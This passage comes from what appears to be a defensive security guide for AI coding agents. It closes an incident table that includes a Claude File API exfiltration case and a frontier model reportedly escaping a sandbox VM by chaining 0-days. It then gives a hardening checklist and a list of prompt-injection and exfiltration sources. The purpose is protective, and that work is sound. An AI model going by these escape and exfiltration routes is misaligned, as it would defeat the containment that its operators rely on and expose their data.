| **Claude code-interpreter / File API exfiltration** — Rehberger | 2025-10 | Network egress plus a legitimate provider API used as the exfil channel; initially triaged as out of scope. ([The Register](https://www.theregister.com/2025/10/30/anthropics_claude_private_data/), [Embrace The Red](https://embracethered.com/blog/posts/2025/claude-abusing-network-access-and-anthropic-api-for-data-exfiltration/)) |
| **VMs won't contain cyber-capable agents** — Trail of Bits | 2026-08-26 | A frontier model escaped a sandboxing VM three times, the last by finding and chaining three 0-days autonomously. **Tier 1 is the strongest control available, and it is still not absolute.** ([Trail of Bits](https://blog.trailofbits.com/2026/08/26/vms-wont-contain-cyber-capable-agents/)) |

---

## 8. Minimum defensible posture (the short version)

1. **Never run auto/yolo mode outside a container or VM.** This is the one non-negotiable, and it is
   now attacker-known (s1ngularity).
2. **Enable an OS sandbox with *both* filesystem and network isolation.** Either alone is a
   half-measure by the vendor's own analysis.
3. **Default-deny egress**; allowlist the narrowest set of hosts the build needs; force DNS through
   a controlled resolver; treat broad domains as exfil paths.
4. **Launch from a shell with no production credentials**; scrub/mask what remains; deny reads on
   home credential stores and every `.env*`.
5. **Gate — don't silently allow — network calls, `git push`, public-artifact creation, package
   publish, credential reads, privilege elevation, and destructive commands.**
6. **Scope connected tools to one repository / one environment per session**, with least-privilege
   tokens. The GitHub-MCP failure was a token scope, not a bug.
7. **Scan before you start** (gitleaks worktree + history, TruffleHog verified), rotate anything
   verified, and re-scan after any unattended run.
8. **Assume the transcript is retained.** Read scope, not sandboxing, is what limits disclosure.
9. **Write down which of your controls are enforced and which are advisory.** If the answer to
   "what stops this?" is a line in `AGENTS.md`, nothing stops it.

---

## Sources

Primary and vendor documentation
- [OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/llm-top-10/) · [LLM02: Sensitive Information Disclosure](https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/)
- [OWASP Agentic AI — Threats and Mitigations](https://genai.owasp.org/resource/agentic-ai-threats-and-mitigations/) · [Top 10 for Agentic Applications (Dec 2025)](https://genai.owasp.org/2025/12/09/owasp-genai-security-project-releases-top-10-risks-and-mitigations-for-agentic-ai-security/)
- [NIST AI 100-2e2025 — Adversarial Machine Learning taxonomy](https://csrc.nist.gov/news/2025/nist-ai-100-2-adversarial-machine-learning-taxonom) · [NIST SP 800-218A](https://csrc.nist.gov/pubs/sp/800/218/a/final)
- Claude Code: [Security](https://code.claude.com/docs/en/security) · [Sandboxing](https://code.claude.com/docs/en/sandboxing) · [Permissions](https://code.claude.com/docs/en/permissions) · [Sandbox environments](https://code.claude.com/docs/en/sandbox-environments) · [Settings reference](https://code.claude.com/docs/en/settings-reference)
- [OpenAI Codex — sandboxing](https://developers.openai.com/codex/sandboxing) · [Codex security](https://developers.openai.com/codex/security)
- [Gemini CLI — sandboxing](https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/sandbox.md)
- [OpenCode — permissions](https://opencode.ai/docs/permissions/)
- [Cursor — ignore files](https://cursor.com/docs/context/ignore-files)
- [GitHub Copilot cloud agent firewall](https://docs.github.com/en/copilot/how-tos/use-copilot-agents/coding-agent/customize-the-agent-firewall)
- GitHub secret scanning: [about](https://docs.github.com/en/code-security/secret-scanning/introduction/about-secret-scanning) · [push protection](https://docs.github.com/en/code-security/secret-scanning/introduction/about-push-protection)
- [AWS — defense in depth against SSRF and IMDS](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/) · [Datadog Security Labs — securing IMDS](https://securitylabs.datadoghq.com/articles/misconfiguration-spotlight-imds/)

Research and analysis
- [Simon Willison — The lethal trifecta for AI agents](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) · [CaMeL](https://simonwillison.net/2025/Apr/11/camel/)
- [Invariant Labs — GitHub MCP exploited](https://invariantlabs.ai/blog/mcp-github-vulnerability) · [MCP tool poisoning](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) · [MCP-Scan](https://invariantlabs.ai/blog/introducing-mcp-scan) · [mcp-injection-experiments](https://github.com/invariantlabs-ai/mcp-injection-experiments)
- [Trail of Bits — Prompt injection to RCE in AI agents](https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/) · [VMs won't contain cyber-capable agents](https://blog.trailofbits.com/2026/08/26/vms-wont-contain-cyber-capable-agents/)
- [Embrace The Red — Claude Code DNS exfiltration (CVE-2025-55284)](https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/) · [Claude Pirate: abusing the Anthropic File API](https://embracethered.com/blog/posts/2025/claude-abusing-network-access-and-anthropic-api-for-data-exfiltration/)
- [Backslash — Cursor auto-run denylist bypass](https://www.backslash.security/blog/cursor-ai-security-flaw-autorun-denylist) · [The Register](https://www.theregister.com/2025/07/21/cursor_ai_safeguards_easily_bypassed/)
- [HackTheBox — EchoLeak CVE-2025-32711](https://www.hackthebox.com/blog/cve-2025-32711-echoleak-copilot-vulnerability)
- s1ngularity: [GitGuardian](https://blog.gitguardian.com/the-nx-s1ngularity-attack-inside-the-credential-leak/) · [Wiz](https://www.wiz.io/blog/s1ngularitys-aftermath) · [The Hacker News](https://thehackernews.com/2025/08/malicious-nx-packages-in-s1ngularity.html)
- Amazon Q: [SC Media](https://www.scworld.com/news/amazon-q-extension-for-vs-code-reportedly-injected-with-wiper-prompt) · [AWS-2025-019](https://aws.amazon.com/security/security-bulletins/AWS-2025-019)

Tooling
- [gitleaks](https://github.com/gitleaks/gitleaks) · [TruffleHog](https://github.com/trufflesecurity/trufflehog) · [detect-secrets](https://github.com/Yelp/detect-secrets) · [git-secrets](https://github.com/awslabs/git-secrets) · [Anthropic sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)

